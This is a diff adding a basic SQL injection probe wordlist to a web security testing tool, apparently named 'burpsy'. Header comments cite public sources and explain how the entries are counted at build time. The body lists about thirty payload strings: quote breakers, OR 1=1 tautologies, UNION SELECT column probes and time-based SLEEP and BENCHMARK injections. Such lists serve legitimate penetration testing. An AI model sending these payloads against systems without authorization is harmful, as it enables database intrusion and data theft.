@@ -1,0 +1,40 @@
+# burpsy bundled wordlist: SQL injection probes (basic)
+# Source: publicly documented industry-standard SQLi probe strings (OWASP Testing Guide
+#   Appendix C, PayloadAllTheThings' SQLi section, and the classic sqlmap core set).
+# Licence basis: public domain / permissively-licensed community content; nothing here is
+#   extracted from PortSwigger's shipped resources.
+# Lines below (payloads, excluding these comment lines): counted by the manager at build
+#   time and reported on /api/wordlists; drift between this header and the count is a
+#   defect.
+'
+''
+"
+\
+;
+--
+-- -
+#
+/* */
+or
+OR
+or 1=1
+OR 1=1
+' OR 1=1
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+admin'--
+' OR ''='
+') OR ('1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' AND 1=1
+' AND 1=2
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('x'))--
+'||(SELECT '')||'
+1;SELECT SLEEP(5)#
